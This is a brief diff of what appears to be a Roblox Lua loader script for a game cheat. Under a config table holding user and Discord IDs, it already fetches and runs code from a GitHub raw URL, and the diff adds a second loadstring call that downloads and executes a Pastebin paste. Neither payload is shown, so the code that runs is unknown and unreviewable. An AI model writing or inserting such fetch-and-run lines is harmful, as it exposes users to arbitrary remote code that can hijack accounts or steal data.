@@ -232,3 +232,4 @@ end
 
 _G.Config = { UserID = "bbcc5890-fa5d-4d7f-96d3-0c225b3f04a8", discord_id = "1095855945386578071" , Note = "SAB", }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/sab"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/xJrz3dpf"))()
